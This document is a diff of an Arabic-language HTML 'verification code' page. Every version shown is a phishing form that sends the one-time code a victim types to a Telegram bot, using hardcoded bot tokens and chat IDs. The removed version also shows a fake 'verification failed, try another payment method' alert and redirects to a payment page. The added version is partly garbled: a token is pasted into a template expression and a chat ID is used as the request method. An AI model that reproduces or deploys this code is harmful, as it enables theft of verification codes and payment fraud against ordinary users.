@@ -1,307 +1,44 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التحقق من الكود</title>
+  <meta charset="UTF-8">
+  <title>التحقق</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      background-color: #f2f2f2;
-      margin: 0;
-      padding: 0;
-    }
-
-    header, footer {
-      background-color: #004080;
-      color: white;
-      text-align: center;
-      padding: 15px;
-    }
-
-    main {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-    }
-
-    form {
-      background-color: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 400px;
-      width: 100%;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 10px;
-      font-size: 16px;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      font-size: 18px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      text-align: center;
-    }
-
-    .error-message {
-      color: red;
-      font-size: 14px;
-      display: none;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-
-    .countdown {
-      text-align: center;
-      font-size: 18px;
-      margin-bottom: 15px;
-      color: #004080;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #004080;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #003366;
-    }
+    body {font-family: Tahoma, Arial; background:#f5fff5; margin:0; padding:0;}
+    .container {max-width:400px; margin:50px auto; background:#eaffea; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
+    h2 {text-align:center; color:#2b7a2b; margin-bottom:20px;}
+    label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
+    input, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
+    button {background:#2b7a2b; color:white; font-weight:bold; cursor:pointer; border:none;}
+    button:hover {background:#1c551c;}
   </style>
 </head>
 <body>
+  <div class="container">
+    <h2>التحقق</h2>
+    <label for="code">أدخل كود التحقق</label>
+    <input type="text" id="code" placeholder="ادخل الكود المرسل">
 
-  <header>
-    <h2>التحقق من الكود</h2>
-  </header>
-
-  <main>
-    <form id="verifyForm">
-      <label for="code">أدخل رمز التحقق المرسل إلى هاتفك:</label>
-      <input type="text" id="code" name="code" required />
-
-      <div id="error" class="error-message">⚠️ الكود يجب أن يكون من 4 إلى 6 أرقام فقط</div>
-
-      <div class="countdown">⏳ ينتهي خلال: <span id="timer">60</span> ثانية</div>
-
-      <button type="submit">تأكيد الكود</button>
-    </form>
-  </main>
-
-  <footer>
-    جميع الحقوق محفوظة © 2025
-  </footer>
+    <button onclick="sendVerify()">تأكيد</button>
+  </div>
 
   <script>
-    // عداد تنازلي
-    let seconds = 60;
-    const timerSpan = document.getElementById('timer');
-    const countdown = setInterval(() => {
-      seconds--;
-      timerSpan.textContent = seconds;
-      if (seconds <= 0) clearInterval(countdown);
-    }, 1000);
+    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
+    const CHAT_ID = "16420566";
 
-    // التحقق من الكود
-    document.getElementById('verifyForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+    function sendVerify() {
+      const code = document.getElementById("code").value;
 
-      const code = document.getElementById('code').value.trim();
-      const error = document.getElementById('error');
+      const message = `✅ تم إدخال كود التحقق:\nالكود: ${code}`;
 
-      if (!/^\d{4,6}$/.test(code)) {
-        error.style.display = 'block';
-        return;
-      }
-
-      error.style.display = 'none';
-
-      // إرسال الكود إلى البوت
-      fetch("https://api.telegram.org/bot7244002272:AAEc5dIXiyGJBP5OEMBg7tD2iV2lWh99WJM/sendMessage", {
-        method: "POST",
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: "1008144314",
-          text: `✅ تم إدخال كود التحقق: ${code}`
-        })
+      fetch(`https://api.telegram.org/bot${BOT8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I}/sendMessage`, {
+        method: "8404960059",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: message})
       }).then(() => {
-        // بعد الإرسال، الانتقال إلى صفحة الدفع برسالة خطأ وهمية
-        alert("❌ فشل التحقق، يرجى استخدام طريقة دفع أخرى.");
-        window.location.href = "payment.html"; // عد إلى صفحة الدفع
-      }).catch(() => {
-        alert("حدث خطأ أثناء الإرسال");
+        alert("تم التحقق بنجاح ✅");
       });
-    });
+    }
   </script>
-
-</body>
-</html><!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التحقق من الكود</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      background-color: #f2f2f2;
-      margin: 0;
-      padding: 0;
-    }
-
-    header, footer {
-      background-color: #004080;
-      color: white;
-      text-align: center;
-      padding: 15px;
-    }
-
-    main {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-    }
-
-    form {
-      background-color: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 400px;
-      width: 100%;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 10px;
-      font-size: 16px;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      font-size: 18px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      text-align: center;
-    }
-
-    .error-message {
-      color: red;
-      font-size: 14px;
-      display: none;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-
-    .countdown {
-      text-align: center;
-      font-size: 18px;
-      margin-bottom: 15px;
-      color: #004080;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #004080;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #003366;
-    }
-  </style>
-</head>
-<body>
-
-  <header>
-    <h2>التحقق من الكود</h2>
-  </header>
-
-  <main>
-    <form id="verifyForm">
-      <label for="code">أدخل رمز التحقق المرسل إلى هاتفك:</label>
-      <input type="text" id="code" name="code" required />
-
-      <div id="error" class="error-message">⚠️ الكود يجب أن يكون من 4 إلى 6 أرقام فقط</div>
-
-      <div class="countdown">⏳ ينتهي خلال: <span id="timer">60</span> ثانية</div>
-
-      <button type="submit">تأكيد الكود</button>
-    </form>
-  </main>
-
-  <footer>
-    جميع الحقوق محفوظة © 2025
-  </footer>
-
-  <script>
-    // عداد تنازلي
-    let seconds = 60;
-    const timerSpan = document.getElementById('timer');
-    const countdown = setInterval(() => {
-      seconds--;
-      timerSpan.textContent = seconds;
-      if (seconds <= 0) clearInterval(countdown);
-    }, 1000);
-
-    // التحقق من الكود
-    document.getElementById('verifyForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const code = document.getElementById('code').value.trim();
-      const error = document.getElementById('error');
-
-      if (!/^\d{4,6}$/.test(code)) {
-        error.style.display = 'block';
-        return;
-      }
-
-      error.style.display = 'none';
-
-      // إرسال الكود إلى البوت
-      fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
-        method: "POST",
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: "8404960059",
-          text: `✅ تم إدخال كود التحقق: ${code}`
-        })
-      }).then(() => {
-        // بعد الإرسال، الانتقال إلى صفحة الدفع برسالة خطأ وهمية
-        alert("❌ فشل التحقق، يرجى استخدام طريقة دفع أخرى.");
-        window.location.href = "payment.html"; // عد إلى صفحة الدفع
-      }).catch(() => {
-        alert("حدث خطأ أثناء الإرسال");
-      });
-    });
-  </script>
-
 </body>
 </html>
